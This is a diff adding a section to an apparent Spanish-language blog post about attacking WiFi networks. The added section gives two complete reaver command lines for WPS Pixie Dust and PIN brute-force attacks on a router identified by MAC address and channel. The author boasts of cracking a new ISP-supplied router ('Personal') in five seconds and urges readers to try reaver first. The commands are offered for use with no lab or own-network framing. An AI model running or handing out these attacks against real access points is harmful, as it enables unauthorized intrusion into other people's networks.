@@ -3,6 +3,27 @@ title: "Atacando redes WiFis y explotando vulnerabilidades de computadoras dentr
 date: 2024-07-21T19:48:09-03:00
 tags: ['atacando','redes','ciberseguridad','vulnerabilidades']
 ---
+Si es vulnerable con pixie mas wps con correr este comando es mas que suficiente y
+es para cualquier distro.
+
+
+```bash
+sudo reaver -i wlan0 -b mac_address -c canal -K 1 -Z -vvv
+```
+
+Si te falla pasamos a:
+
+
+```bash
+sudo reaver -i wlan0 -b mac_address -c canal -S -N -L -d 10 -r 3:15 -T .5 -vv
+```
+
+Hoy saque una de las nuevas de Personal en 5 segundos usando el segundo comando.
+
+Por favor, SIEMPRE prueben antes ataques via reaver antes de pasar a otros mas complejos.
+
+---
+
 #### Airgeddon captura handshakes rotos es mejor usar hcxdumptool
 Quizás en un futuro mejore, pero hasta ahora es así.
 
